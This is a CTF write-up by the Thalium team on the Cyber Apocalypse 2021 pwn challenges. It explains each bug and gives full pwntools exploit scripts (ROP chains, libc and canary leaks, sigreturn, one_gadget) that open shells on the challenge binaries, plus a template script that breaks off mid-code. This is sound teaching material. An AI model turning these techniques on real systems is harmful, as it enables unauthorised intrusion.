---
title: "Cyber Apocalypse 2021 1/5 - PWN challenges"
date: 2021-04-28T12:00:00+01:00
draft: false
author: "Jérémy Rubert & Anonymous from Thalium team"
tags:
  - CTF
  - Writeup
  - CyberApocalypse2021
---


Thalium participated in the [Cyber Apocalypse 2021](https://www.hackthebox.eu/cyber-apocalypse-ctf-2021) CTF organized last week by [HackTheBox](https://www.hackthebox.eu/).
It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
Our team finished in fifth place and solved sixty out of the sixty-two challenges:

![fig_scoreboard](/posts/img/Cyber_Apocalypse_2021-scoreboard.png)


This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:

<!--more-->

* [Controller](#controller---difficulty-14)
* [Minefield](#minefield---difficulty-14)
* [System dROP](#system-drop---difficulty-14)
* [Harvester](#harvester---difficulty-24)
* [Save the environment](#save-the-environment---difficulty-24)

We also explain how we solved a misc challenge that could have been in the pwn category:

* [Close the door](#close-the-door---difficulty-24)

We also publish our solutions to some challenges in other categories:

* [Wii-Phit](/posts/apocalypse2021-wii-phit/): crypto, solved by 38 teams
* [Off-the-grid](/posts/apocalypse2021-off-the-grid/): hardware, solved by 99 teams
* [Discovery](/posts/apocalypse2021-discovery/): hardware, solved by 17 teams
* [Artillery](/posts/apocalypse2021-artillery/): web, solved by 45 teams

## Tooling

For tooling we used:

* [IDA](https://www.hex-rays.com/ida-pro/) for binary analysis;
* [ROPGadget](https://github.com/JonathanSalwan/ROPgadget) to find gadgets and help to build ROP chains;
* [OneGadget](https://github.com/david942j/one_gadget) to find libc addresses that give a shell;
* a custom [pwntools](https://github.com/Gallopsled/pwntools) template (available in the [appendix](#template-script-for-exploitation-based-on-pwntoolshttpsgithubcomgallopsledpwntools)) that eases the following actions:
  
  * Communicating with the target process (local or remote for flag!);
  * Launching debugger with breakpoints automatically set ;
  * Easily retrieving information such as function offset or symbols offset inside libraries and binaries;
  * Executing the target process with a specific libc and a specific dynamic linker.


Each challenge implements a specific communication scheme, thus, we have to adapt the content of the `exploit` function of the template to correctly interact with the binary, and leverage its vulnerabilities to retrieve the flag. To run the local binary without debugger the script must be used as follows:

```sh
python script.py ./my_binary
```

To run the program with a debugger attached:

```sh
python script.py ./my_binary -d
```

The most important thing is to run the binary with the target versions of dynamic linker and c runtime library. To ensure this:

* Download the [ld binary](/posts/binaries/Cyber_Apocalypse_2021/ld-linux-x86-64.so.zip) provided
* Copy the ld binary inside your library path and rename it `ld-2.27.so`
* Copy the libc provided by the challenge and rename it `libc-2.27.so`
* Run the script whith the following parameters

```sh
python script.py ./my_binary -libc 2.27 
```

The version of library can be changed if needed but this is the version used for all pwn challenges - and misc close_the_door - during this ctf.

Finally, to use the exploit against the remote infrastructure:

```sh
python script.py ./environment -libc 2.27 -r [IP] [PORT] 
```

## Controller - Difficulty 1/4

*Challenge files: [pwn_controller.zip](/posts/binaries/Cyber_Apocalypse_2021/pwn_controller.zip)*

`Controller` is a **64 bits ELF**, which asks the user to choose a simple arithmetic operation and enter two operands. Numbers provided cannot be greater than 69.

![fig_controller](/posts/img/Cyber_Apocalypse_2021-controller.png)

### Attack method

We notice an interesting function, `calculator`:

```c
__int64 __fastcall calculator(__int64 a1)
{
  __int64 result; // rax
  char buff[28]; // [rsp+0h] [rbp-20h] BYREF
  int calc_value; // [rsp+1Ch] [rbp-4h]

  calc_value = calc();
  if ( calc_value != 65338 )
    return calculator(a1);
  printstr("Something odd happened!\nDo you want to report the problem?\n> ");
  __isoc99_scanf("%s", buff);
  [...]
}
```

If the operation result is **65338**, we may access a juicy scanf that will overflow the stack buffer `buff`.

#### Found a way to access to the scanf

We notice that the calculation is done with **signed int** but the result is stored inside an **unsigned int** into the function `calc`. After a few tries we found that `66 * -3` results in the target value.

![fig_controller_good_calculation](/posts/img/Cyber_Apocalypse_2021-controller_calc.png)

#### Exploit the stack overflow with scanf

Now we can access the scanf and overflow the stack. Protections are as follows:

```sh
[*] 'controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and No canary found: we will build a ropchain. There is no magic / hidden function inside the binary, so we use `one_gadget` to list available automatic shell gadgets and their constraints:

```c
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

A new problem arises. We have only one scanf to send our payload to leak the libc base address and jump to the one gadget.
The solution here is to call again scanf with the ROP payload, to calculate the one gadget address and put it somewhere into the binary.
The ROP payload will then call this address.

![fig_controller_exploit_schema](/posts/img/Cyber_Apocalypse_2021-controller_exploit.png)

### Exploitation

This is how we perform the three steps explained before.

#### 1. Leak the libc address

We use the `puts` function present inside `controller` to leak the libc address of the `printf` function.

Using ROPGadget we found the following one to set the put parameter in place:

```
0x00000000004011d3 : pop rdi ; ret
```

So the ROP part for this section is:

```python
gadget_pop_rdi     = 0x4011d3

# Set parameters before call puts
ropchain += p64(gadget_pop_rdi) + p64(elf.got['printf'])
# Call puts
ropchain += p64(elf.plt['puts'])
```

#### 2. Recall scanf after the leak

We must pass two parameters to `scanf`. The first one is the format, and the second one is the address of the destination buffer that will be filled by `scanf` according to the format string.

We used the format string `%s` present inside the controller binary:

```
.rodata:00000000004013E6 aS              db '%s',0 
```

We choose a writable memory address to be filled with the one gadget addr: `0x602100`. We load this address into `rsi` with the new gadget:

```
0x00000000004011d1 : pop rsi ; pop r15 ; ret
```

There is still a problem. If the stack is not aligned during the `scanf` call, a crash happens because `scanf` uses xmm registers. Aligning the stack is not terribly difficult, one simply has to add a useless `ret`, which subtracts eight bytes from `rsp` before calling `scanf`:

```
0x0000000000400606 : ret
```

The ROP part for this section is:

```python
gadget_pop_rsi_r15 = 0x4011d1
gadget_ret         = 0x400606
format_string_s    = 0x4013E6
target_addr        = 0x602100

# Set parameters before call scanf
ropchain += p64(gadget_pop_rdi) + p64(format_string_s)
ropchain += p64(gadget_pop_rsi_r15) + p64(target_addr) + p64(0)
# Realign the stack to 0x10
ropchain += p64(gadget_ret)
# Call scanf
ropchain += p64(elf.plt['__isoc99_scanf'])
```

#### 3. Call the one gadget

The following gadget allow to do an indirect call:

```
0x00000000004011b0: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]
``` 

We must master registers r12 and rbx to call the one gadget function. The last gadget allow us to do that:

```
0x00000000004011ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
```

The ROP part for this section is:

```python
gadget_pop_rbx_      = 0x4011ca
gadget_indirect_call = 0x4011b0

# Set value to registers
rbx = 0x0
ropchain += p64(gadget_pop_rbx_) + p64(rbx) + p64(0) + p64(target_addr) + 3*p64(0)
# Call the one gadget !
ropchain += p64(gadget_indirect_call)
```

#### 4. Put it all together

This is the final payload to exploit this binary used with the base script:

```python
import time
from struct import unpack

def get_ropchain(elf):
    ropchain = b'A'*32
    ropchain += p64(0xdeadbeef) # rbp

    # -> Now we are on RIP position

    # 1. Leak the libc address
    gadget_pop_rdi     = 0x4011d3

    # Set parameters before call puts
    ropchain += p64(gadget_pop_rdi) + p64(elf.got['printf'])
    # Call puts
    ropchain += p64(elf.plt['puts'])

    # 2. Recall scanf after the leak
    gadget_pop_rsi_r15 = 0x4011d1
    gadget_ret         = 0x400606
    format_string_s    = 0x4013E6
    target_addr        = 0x602100

    # Set parameters before call scanf
    ropchain += p64(gadget_pop_rdi) + p64(format_string_s)
    ropchain += p64(gadget_pop_rsi_r15) + p64(target_addr) + p64(0)
    # Realign the stack to 0x10
    ropchain += p64(gadget_ret)
    # Call scanf
    ropchain += p64(elf.plt['__isoc99_scanf'])

    # 3. Call the one gadget
    gadget_pop_rbx_      = 0x4011ca
    gadget_indirect_call = 0x4011b0

    # Set value to registers
    rbx = 0x0
    ropchain += p64(gadget_pop_rbx_) + p64(rbx) + p64(0) + p64(target_addr) + 3*p64(0)
    # Call the one gadget !
    ropchain += p64(gadget_indirect_call)

    # Set 0 to match one gadget condition
    ropchain += p64(0)*256

    return ropchain

def exploit(p, elf, libc):

    # Access to scanf after the good calculation
    p.recvuntil(b'of recources: ')
    p.sendline('66 -3')

    p.recvuntil(b'> ')
    p.sendline('3')

    # Now we can trigger scanf
    p.recvuntil(b'problem?\n> ')

    # Create ROP chain
    ropchain = get_ropchain(elf)

    # Send ROP chain
    p.sendline(ropchain)

    # Read data to get printf addr inside libc
    time.sleep(4.0) # wait before puts execute

    data = p.recv()
    
    elms = data.split(b'\n')

    x = elms[1]

    assert(len(x) < 8)
    while len(x) < 8:
        x += b'\x00'
    
    leak = unpack('Q', x)[0]
    print('leak printf@0x%x' % leak)

    libc_base = leak - libc.symbols['printf']
    print('leak libc@0x%x' % libc_base)

    # Send one gadget inside the new scanf call

    one_gadget = libc_base + 0x4f432 
    print('one_gadget @0x%x' % one_gadget)

    p.sendline(p64(one_gadget))

    # Enjoy the shell !
    p.interactive()
```

We get a shell :):

![fig_controller_shell](/posts/img/Cyber_Apocalypse_2021-controller_shell.png)


## Minefield - Difficulty 1/4

*Challenge files: [pwn_mindfield.zip](/posts/binaries/Cyber_Apocalypse_2021/pwn_mindfield.zip)*

 `Minefield` is a **64 bits ELF** that asks questions to the user to plant a mine:

![fig_controller_minefield](/posts/img/Cyber_Apocalypse_2021-minefield.png)

### Attack method

This challenge is a very basic one. The inputs **type** and **location** allow to write something at a controlled address:

```c
printf("Insert type of mine: ");
r(nptr);
target_addr = (_QWORD *)strtoull(nptr, 0LL, 0);
printf("Insert location to plant: ");
r(target_value);
puts("We need to get out of here as soon as possible. Run!");
*target_addr = strtoull(target_value, 0LL, 0);
```

We do not have the libc for this challenge but we have a win function named `_` at address `0x40096B`

```c
v0 = strlen("\nMission accomplished! ✔\n");
write(1, "\nMission accomplished! ✔\n", v0);
system("cat flag*");
```

Note that the same write-what-where vulnerability is used in the challenge [Save the environment](#save-the-environment---difficulty-24).

### Exploitation

Protections are as follow:

```sh
[*] 'minefield'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The binary is not PIE so ALSR is not a problem here. A leak is not needed to exploit this binary.

We have all elements but it remains to know what to overwrite to win. We choose to overwrite the function pointer present in the `.fini_array` section. This function pointer is called at the end of the execution. This pointer is at address `0x601078`.

Finally the exploit is really simple:

![fig_controller_minefield](/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png)

## System dROP - Difficulty 1/4

*Challenge files: [pwn_system_drop.zip](/posts/binaries/Cyber_Apocalypse_2021/pwn_system_drop.zip)*

```sh
[*] '/home/user/Apocalypse/system-drop/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`No PIE` and `No canary found` suggest a stack overflow. However the binary is _very_ small.

### The vulnerability

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  alarm(0xFu);
  read(0, buf, 0x100uLL);
  return 1;
}
```

A stack overflow, clear and simple.

### Attack method

However, the binary is small and does not have any leak-friendly function.

```
.text:0000000000400537 ; =============== S U B R O U T I N E ==================
.text:0000000000400537
.text:0000000000400537 ; Attributes: bp-based frame
.text:0000000000400537
.text:0000000000400537 ; __int64 syscall(__int64 sysno, ...)
.text:0000000000400537                 public _syscall
.text:0000000000400537 _syscall        proc near
.text:0000000000400537 ; __unwind {
.text:0000000000400537                 push    rbp
.text:0000000000400538                 mov     rbp, rsp
.text:000000000040053B                 syscall                 ; LINUX -
.text:000000000040053D                 retn
.text:000000000040053D _syscall        endp ; sp-analysis failed
.text:000000000040053D
.text:000000000040053D ; -------------------------------------------------------
.text:000000000040053E                 db 90h
.text:000000000040053F ; -------------------------------------------------------
.text:000000000040053F                 pop     rbp
.text:0000000000400540                 retn
.text:0000000000400540 ; } // starts at 400537
.text:0000000000400541
.text:0000000000400541 ; =============== S U B R O U T I N E ===================
.text:0000000000400541
.text:0000000000400541 ; Attributes: bp-based frame
.text:0000000000400541
.text:0000000000400541 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000400541                 public main
.text:0000000000400541 main            proc near
.text:0000000000400541
.text:0000000000400541 buf             = byte ptr -20h
.text:0000000000400541
.text:0000000000400541 ; __unwind {
.text:0000000000400541                 push    rbp
.text:0000000000400542                 mov     rbp, rsp
.text:0000000000400545                 sub     rsp, 20h
.text:0000000000400549                 mov     edi, 0Fh        ; seconds
.text:000000000040054E                 call    _alarm
.text:0000000000400553                 lea     rax, [rbp+buf]
.text:0000000000400557                 mov     edx, 100h       ; nbytes
.text:000000000040055C                 mov     rsi, rax        ; buf
.text:000000000040055F                 mov     edi, 0          ; fd
.text:0000000000400564                 call    _read
.text:0000000000400569                 mov     eax, 1
.text:000000000040056E                 leave
.text:000000000040056F                 retn
.text:000000000040056F ; } // starts at 400541
.text:000000000040056F main            endp
```

The function at `0x400537` is a gift ! We have a raw syscall instruction. However, to have control over the syscall, we first need to control `rax`, and no gadget allows us to control `rax` trivially, apart from `0x400569` which allows to set `eax=1`.

`sigreturn` is a nice system call in this case, which will read cpu context from the stack, consequently allowing us to control all the registers. The syscall number associated with it is `0xf`. So we are looking at setting `eax=0xf`.

Reading the alarm manpage is rather interesting:

```c
ALARM(2)                   Linux Programmer's Manual                  ALARM(2)

NAME
       alarm - set an alarm clock for delivery of a signal
...
RETURN VALUE
       alarm() returns the number of seconds remaining  until  any  previously
       scheduled alarm was due to be delivered, or zero if there was no previ‐
       ously scheduled alarm.
...
```

For this challenge, calling `alarm()` will set the alarm to fire later, and a nice side-effect, will also set `eax` to the remaining number of seconds until the scheduled alarm fires. Thus calling `alarm()` sets `eax=0xf`, which is what we wanted.

We will go for a `sigreturn`, and cook the stack for it to work correctly:

```python
from pwn import SigreturnFrame, constants
def exploit(p, elf, libc):
	stack_base = 0x601800  

	ropchain = b''

	ropchain += b'A'*32
	ropchain += p64(stack_base) # rbp

	# 0x00000000004005d1 : pop rsi ; pop r15 ; ret
	gadget_pop_rsi_r15 = 0x4005d1
	
	ropchain += p64(gadget_pop_rsi_r15) + p64(stack_base) + p64(0)

	# 0x0000000000400564 : call read
	call_read = 0x400564
	
	ropchain += p64(call_read) + p64(stack_base) 

	# Pad for reach end of first read
	while len(ropchain) < 256:
	  ropchain += b'Z'
	assert(len(ropchain) == 256)
	
	
	# Send cmd into the stack with read
	# just before addr used to continue the ROP
	ropchain += b'/bin/sh\x00'
	
	# Rop continuation
	syscall_inst = 0x40053b
	
	ropchain += p64(elf.plt['alarm'])
	ropchain += p64(syscall_inst)

	frame     = SigreturnFrame()
	frame.rax = constants.SYS_execve
	frame.rdi = stack_base
	frame.rsi = 0
	frame.rdx = 0
	frame.r8  = 0
	frame.rsp = 0x601000
	frame.rip = syscall_inst
	ropchain += bytes(frame)

	p.send(ropchain)

	p.interactive()
```

The magic shell is coming:

![fig_system_drop_win](/posts/img/Cyber_Apocalypse_2021-system_drop_win.png)

## Harvester - Difficulty 2/4

*Challenge files: [pwn_harvester.zip](/posts/binaries/Cyber_Apocalypse_2021/pwn_harvester.zip)*

The `harvester` is a 64bits ELF that allows to perform some actions:

![fig_harvester](/posts/img/Cyber_Apocalypse_2021-harvester.png)

The libc used by the binary is provided with this challenge.

### Attack method

Protections are as follow:

```sh
[*] 'harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

#### Harvest information required to bypass ASLR and stack cookie

We will use the format string vulnerability in `fight`:

```c
printstr("\nChoose weapon:\n");
printstr("\n[1] 🗡\t\t[2] 💣\n[3] 🏹\t\t[4] 🔫\n> ");
read(0, weapon, 5uLL);
printstr("\nYour choice is: "); 
printf((char *)weapon);
```

* `%3$p`: will leak a libc address, thereby bypassing libc ASLR
* `%15$p`: will leak the stack cookie, thereby bypassing stack protection

```python
    p.recvuntil(b'> ')
    p.sendline(b'1')

    p.recvuntil(b'> ')
    p.sendline(b'%3$p')

    data = p.recvuntil(b'> ')
    m = re.search(b'Your choice is: (0x[a-fA-F0-9]+)\n', data)
    assert(m)
    libc_leak = int(m.group(1), 0)

    libc_base = libc_leak - 0xe4774
    assert((libc_base & 0xfff) == 0)

    p.sendline(b'1')

    data = p.recvuntil(b'> ')
    p.sendline(b'%15$p')

    data = p.recvuntil(b'> ')
    m = re.search(b'Your choice is: (0x[a-fA-F0-9]+00)', data)
    assert(m)

    cookie = int(m.group(1), 0)
```

#### Stack overflow

There is a stack overflow in `stare`, however, to trigger it we need to have 22 pies:

```c
// stare
char buf[40]; // [rsp+0h] [rbp-30h] BYREF

[...]
printstr("\n[+] You found 1 \u1F967!\n");
if ( ++pie == 22 )
{
  printf("\x1B[1;32m");
  printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
  printstr("\nDo you want to feed it?\n> ");
  read(0, buf, 0x40uLL); // Overflow !
  printf("\x1B[1;31m");
  printstr("\nThis did not work as planned..\n");
}
```

We do have a way to increment pies one by one using `stare`, but then the program will stop when reaching 16 pies:

```c
void check_pie(int pie)
{
  [...]

  printf("\x1B[1;31m");
  if ( pie <= 0 )
  {
    printstr(&unk_1090);
    exit(1);
  }
  if ( pie > 100 || pie == 15 )
  {
    printstr(&unk_10A4);
    exit(1);
  }
}
```

Once this requirement will be satisfied, everything will be ready to make an effective stack overflow, as we have libc addresses and the stack cookie.

#### Stealing pies

The last function to use is `inventory`, which we can use to leave items from our stuff. However, we can specify a negative integer, which will cause the inventory to be incremented, and not decremented as planned.

```c
printstr("\nHow many do you want to drop?\n> ");
__isoc99_scanf("%d", &v1);
pie -= v1;
```
The exploit code:

```python
    p.sendline(b'2')

    p.recvuntil(b'> ')
    p.sendline(b'y')

    p.recvuntil(b'> ')
    p.sendline(b'-11')

    p.recvuntil(b'> ')
```

On the next call to `stare`, the count of pies will reach 22, which will trigger the stack overflow.

### Exploitation

The last step is to find a one_gadget that works with our constraints, and build the stack payload to overwrite the legitimate stack and gain a shell:

```python
    p.sendline(b'3')
    p.recvuntil(b'> ')

    ropchain = b''

    one_gadget = 0x4f3d5
    ropchain += flat({
      40: p64(cookie),
      56: p64(libc_base + one_gadget),
    }, length=64, filler=cyclic(64, n=8))

    p.send(ropchain)

    p.interactive()
```

Put it all together:

```python
from pwn import flat, cyclic

def exploit(p, elf, libc):

    # 1. Leak ASLR and stack cookie with format string in fight
    p.recvuntil(b'> ')
    p.sendline(b'1')

    p.recvuntil(b'> ')
    p.sendline(b'%3$p')

    data = p.recvuntil(b'> ')
    m = re.search(b'Your choice is: (0x[a-fA-F0-9]+)\n', data)
    assert(m)
    libc_leak = int(m.group(1), 0)

    libc_base = libc_leak - 0xe4774
    assert((libc_base & 0xfff) == 0)

    p.sendline(b'1')

    data = p.recvuntil(b'> ')
    p.sendline(b'%15$p')

    data = p.recvuntil(b'> ')
    m = re.search(b'Your choice is: (0x[a-fA-F0-9]+00)', data)
    assert(m)

    cookie = int(m.group(1), 0)

    print("Libc base: %x" % libc_base)
    print("Cookie: %x" % cookie)
    
    # 2. Stealing pies with inventory function
    p.sendline(b'2')

    p.recvuntil(b'> ')
    p.sendline(b'y')

    p.recvuntil(b'> ')
    p.sendline(b'-11')

    p.recvuntil(b'> ')
    
    # 3. Exploitation
    p.sendline(b'3')
    p.recvuntil(b'> ')

    ropchain = b''

    one_gadget = 0x4f3d5
    ropchain += flat({
      40: p64(cookie),
      56: p64(libc_base + one_gadget),
    }, length=64, filler=cyclic(64, n=8))

    p.send(ropchain)

    p.interactive()
```


## Save the environment - Difficulty 2/4

*Challenge files: [pwn_save_the_environment.zip](/posts/binaries/Cyber_Apocalypse_2021/pwn_save_the_environment.zip)*

The `environment` binary is an 64bits ELF that allows to plant or recycle.

![fig_environment](/posts/img/Cyber_Apocalypse_2021-environment.png)

Rapidly we view that the challenge is to exploit the binary and not to find bugs. Indeed the vulnerabilities are trivially discovered:

* A leak to `printf` inside the function `recycle->form` after 5 reclycle command

```c
color("You have already recycled at least 5 times! Please accept this gift: ", "magenta");
printf("[%p]\n", &printf);
```

* An arbitrary read inside the function `recycle->form` after 10 reclycle command

```c
color("You have recycled 10 times! Feel free to ask me whatever you want.\n> ", "cyan");
read(0, nptr, 0x10uLL);
s = (char *)strtoull(nptr, 0LL, 0);
puts(s);
```

* An arbitrary write inside the function `plant`, as already used in [minefield](#minefield---difficulty-14)

```c
printf("> ");
read(0, buff, 0x10uLL);
target_addr = (_QWORD *)strtoull(buff, 0LL, 0);
putchar(10);
color("Where do you want to plant?\n1. City\n2. Forest\n", "green");
printf("> ");
read(0, value, 0x10uLL);
puts("Thanks a lot for your contribution!");
*target_addr = strtoull(target_value, 0LL, 0);
```

* A win function `hidden_resources` at address `0x4010B5` to read the flag
  * There is no need to get a shell

The libc used by the binary is provided with this challenge.

### Attack method

The difficult part here is to get control of RIP.

Protections are as follow:

```sh
[*] 'environment'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The binary is not PIE so we can simply use addresses without leaking the base address of the binary.

We first try to overwrite hooks such `__malloc_hook` or `__free_hook` inside libc but it is impossible to trigger a malloc or a free so overwrite these variables has no effect. Another attempt we made is to overwrite the function pointers in `.fini_array` section but this location is read only this time.

We then wanted to leak a stack address to overwrite a saved return address but how to find a saved return address at a predictible location ? The answer comes from the name of the challenge (and [this article](https://github.com/Naetw/CTF-pwn-tips#leak-stack-address)): the **environ** variable inside the libc ! Good thing we have a `printf` leak to get the libc base address and calculate the address of **environ** variable !

Perfect ! We have all the elements to exploit this binary.

### Exploitation

The final exploitation is:

```python
def exploit(p, elf, libc):

    printf_offset  = libc.symbols['printf']
    environ_offset = libc.symbols["environ"]

    # Trigger printf leak by recycling 
    for i in range(0,6):
        p.recvuntil(b'> ')
        p.sendline('2')
        p.recvuntil(b'> ')
        p.sendline('1')
        p.recvuntil(b'> ')
        p.sendline('n')

    # Read printf leak by recycling 
    data = p.recvuntil(b'> ')
    pattern = 'his gift: .+\[(0x[0-9a-f]+)\]'
    result = re.search(pattern, str(data))

    if not result:
        print("FAIL")
        exit(1)

    leak_printf = int(result[1], 16)

    print("Leak printf: %x - Printf offset: %x" % (leak_printf, printf_offset))

    libc_base = leak_printf - printf_offset

    print("Libc base: %x" % libc_base)
    print("Environ read addr %x" % (environ_offset + libc_base))

    # Trigger environ leak by recycling
    for i in range(6, 10):
        p.sendline("2")
        p.recvuntil(b"> ")
        p.sendline("1")
        p.recvuntil(b"> ")
        p.sendline("n")
        p.recvuntil(b"> ")

    toSend = hex(environ_offset + libc_base)
    p.sendline(toSend)
    environ_leak = u64(p.recvuntil(b"> ").split(b"\n")[0][-6:] + b"\x00\x00")
    print("Environ value: %x" % environ_leak)

    fct_hidden_resources = 0x4010B5

    target = environ_leak - 280  # 280 with dbg #288 into the remote

    # Use plant functionnality to overwrite function return
    p.sendline("1")
    p.recvuntil(b"> ")
    p.sendline("0x%08x" % target)
    p.recvuntil(b"> ")
    p.sendline("0x%08x" % fct_hidden_resources)

    p.interactive()
```

The exploit result:

![fig_environment_win](/posts/img/Cyber_Apocalypse_2021-environment_win.png)

## Close the door - Difficulty 2/4

*Challenge files: [misc_close_the_door.zip](/posts/binaries/Cyber_Apocalypse_2021/misc_close_the_door.zip)*

`Close the door` is a **64 bits ELF**:

![fig_close_the_door](/posts/img/Cyber_Apocalypse_2021-close_the_door.png)

The libc used by the binary is provided with this challenge.

### Attack method

Protections are as follow:

```sh
[*] 'close_the_door'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and No canary found, looks like a stack overflow !

`hidden_function` holds the vulnerable part, with a clean stack overflow:

```c
__int64 buf[4]; // [rsp+10h] [rbp-40h] BYREF
int v3; // [rsp+30h] [rbp-20h]
int v4; // [rsp+34h] [rbp-1Ch]
char *v5; // [rsp+38h] [rbp-18h]
int v6; // [rsp+44h] [rbp-Ch]
char *s; // [rsp+48h] [rbp-8h]

[...]
s = "Do you think this is the secret password?\n> ";
v6 = strlen("Do you think this is the secret password?\n> ");
v5 = "At least we tried...\n";
v4 = strlen("At least we tried...\n");
[...]
write(1, "Do you think this is the secret password?\n> ", v6);
read(0, buf, 0x464uLL);  // Stack overflow !
write(1, v5, v4);
```

However, when overwriting the stack, one has to be cautious not to screw arguments used to perform the write just after:

```c
strace ./close_the_door

read(0, 42
"4", 1)                         = 1
read(0, "2", 1)                         = 1
read(0, "\n", 1)                        = 1
write(1, "You found something interesting!"..., 33You found something interesting!
) = 33
write(1, "Do you think this is the secret "..., 44Do you think this is the secret password?
> ) = 44
read(0, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"..., 1124) = 41
write(1, "SA\211\375I\211\366L)\345H\203\354\10H\301\375\3\350\17\373\377\377H\205\355t 1\333\17\37"..., 1482184792) = -1 EFAULT (Bad address)
```

Both second and third arguments were overwritten by our `X`s slide, making the length goes wild, and pointing to an unexpected - yet valid - memory area.

### Exploit

We will turn it into our advantage: we can give to the `write` function crafted arguments to leak us a libc address. Subsequent `read` allows us to inject the computed address of the one-gadget to get a shell.

Our selection for leaking libc address is the GOT entry of alarm:

```python
from pwn import flat, p32
from struct import unpack

def exploit(p, elf, libc):
   p.recvuntil(b'> ')
   p.sendline(b'yolo')

   # Select 42 to access to hidden function
   p.recvuntil(b'> ')
   p.sendline('42')

   p.recvuntil(b'> ')

   # 0x8 -> read 8 bytes (rdx value)
   ropchain = flat({
       36: p32(0x8), 40: p64(elf.got['alarm']),
   }, length=72)

   # 0x0000000000400b53 : pop rdi ; ret
   gadget_pop_rdi       = 0x400b53
   # 0x0000000000400b51 : pop rsi ; pop r15 ; ret
   gadget_pop_rsi_r15   = 0x400b51
   target_addr          = 0x602020
   
   ropchain += p64(gadget_pop_rdi) + p64(0)
   
   ropchain += p64(gadget_pop_rsi_r15) + p64(target_addr) + p64(0)
   ropchain += p64(elf.plt['read'])

   # libc_csu_init
   # 0x0000000000400b4a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
   gadget_many_pop      = 0x400b4a
   #0x0000000000400b30: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]
   gadget_indirect_call = 0x400b30
   
   ropchain += p64(gadget_many_pop) + 2*p64(0)+p64(target_addr)+3*p64(0)
   ropchain += p64(gadget_indirect_call)

   ropchain += 64*p64(0)

   p.send(ropchain)

   # Read libc alarm address
   data = p.recv(8)
   assert(len(data) == 0x8)

   libc_base = unpack('Q', data)[0] - libc.symbols['alarm']
   one_gadget = libc_base + 0x4f432
   p.send(p64(one_gadget))

   p.interactive()
```

We have a shell:

![fig_close_the_door_win](/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png)


## Conclusion

These pwn challenges were fun but not that complicated, at least a good start for begginers to practice linux exploitation.

The Thalium team would like to thank the organizers for this exciting and well-balanced CTF.



## Appendix

### Template script for exploitation based on [pwntools](https://github.com/Gallopsled/pwntools)

Here is the script we used. If we ever improve it, we may publish it on our [CTF repository on github](https://github.com/thalium/thalium_ctf).
```python
from pwn import gdb, context, log, ELF, remote, process, p64, u64
from os import listdir, path
import sys

# Specify the default path of library (use ldd on a binary if needed)
PATH_LIBS = "/usr/lib64/" 


def set_context32():
    context.arch = "i386"  # amd64
    context.bits = 32
    context.endian = "little"
    context.os = "linux"
    context.log_level = "info"
    context.terminal = ["gnome-terminal", "-x", "bash", "-c"]


def set_context64():
    context.arch = "amd64"  # amd64
    context.bits = 64
    context.endian = "little"
    context.os = "linux"
    context.log_level = "info"
    context.terminal = ["gnome-terminal", "-x", "bash", "-c"]


class Mode:
    DEBUG = "-d"
    REMOTE = "-r"
    LIBC = "-libc"


def usage():
    print("Usage in default mode: ./path_to_bin/bin")
    print("Usage in debug mode: -d ./path_to_bin/bin")
    print(
        "Usage with custom libc: -libc VERSION\nLibc must be in %s\nYou can check https://github.com/niklasb/libc-database to find libc binaries.\nYou can check https://github.com/skysider/pwndocker to find how to run with other custom libraries"
        % PATH_LIBS
    )

    print(
        "Usage in remote mode: -r host port ./path_to_bin/bin (*./path_to_libc/libc <- optional)"
    )
    exit()


def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid), "rb").readlines()
    for line in memory_map:
        if sys.argv[1][2:].encode() in line.split(b"-")[-1]:
            return int(line.split(b"-")[0], 16)
    else:
        return 0


def add_bps(r, bps, elf):
    script = "continue\n"
    script = ""

    if elf.pie:
        PIE = get_PIE(r)
    else:
        PIE = 0

    for x in bps:
            script += "b *0x%x\n" % (PIE + x)
    return script


def debug(r, bps, elf):
    script = (
        "set verbose on\n"  # set debug-file-directory /home/user/libs/glibc-2.27/debug
    )
    script += add_bps(r, bps, elf)
    print(script)
    gdb.attach(r, gdbscript=script)


def myExit(msg):
    log.warning(msg)
    exit()


def main():

    if len(sys.argv) < 2:
        usage()
    binary = sys.argv[1]
    try:
        elf = ELF(binary)
    except:
        myExit("Problem with binary path " + binary)

    ldPath = None
    libc = None
    libcPath = None
    DEBUG = False
    REMOTE = False

    env = {}
    i = 2
    while i < len(sys.argv):
        opt = sys.argv[i]
        if opt == Mode.DEBUG:
            log.debug("Enable gdb mode")
            DEBUG = True
            i += 1
        elif opt == Mode.REMOTE:
            try:
                host = sys.argv[i + 1]
